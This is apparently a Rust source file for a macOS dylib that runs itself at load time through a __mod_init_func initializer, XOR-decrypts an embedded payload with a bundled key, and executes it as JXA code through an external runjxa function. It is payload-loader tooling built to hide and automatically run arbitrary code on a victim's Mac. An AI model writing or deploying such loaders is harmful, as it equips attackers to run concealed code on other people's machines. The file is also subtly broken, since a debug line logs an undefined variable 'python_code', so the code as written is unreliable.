extern crate libc;

use libc::{c_char, c_void};
use std::ffi::CString;
use log::{LevelFilter};

pub static CODE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/enc_payload"));
pub static KEY: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/key"));


// https://github.com/codeSamuraii/PrettyBadPrivacy/blob/master/src/main.rs
fn xor_routine<'a>(val: &[u8], key: &[u8]) -> Vec<u8> {
    let encrypted_buffer: Vec<u8> = val.iter().zip(Vec::from(key).iter().cycle()).map(|(&x, &y)| x ^ y).collect();
    return encrypted_buffer;
}

#[link(name = "jxa")]
extern "C" {
    fn runjxa(code: *const libc::c_char) -> c_void;
}

#[used]
#[cfg_attr(target_os = "macos", link_section = "__DATA,__mod_init_func")]
pub static INITIALIZE: extern "C" fn() = init;
#[no_mangle]
pub extern "C" fn init() {
    if cfg!(debug_assertions) {
        simple_logging::log_to_file("/private/tmp/jxa_runner.log", LevelFilter::Debug).unwrap();
    }
    // XOR Decrypt
    let unencrypted_payload = xor_routine(CODE, KEY);
    if cfg!(debug_assertions) {
        log::debug!("Decrypted JXA payload with xor routine and key\n");
        log::debug!("JXA CODE: {:?}\n", python_code);
    }
    let code_string = std::str::from_utf8(&*unencrypted_payload).unwrap();
    let code_cstring = CString::new(code_string).expect("Couldn't create CString");
    if cfg!(debug_assertions) {
        log::debug!("Successfully created CString with JXA code. Executing JXA with runjxa function");
    }
    // Execute the jxa code
    unsafe {
        runjxa(code_cstring.as_ptr());
    }
}


// Test export function
pub fn test_function() {}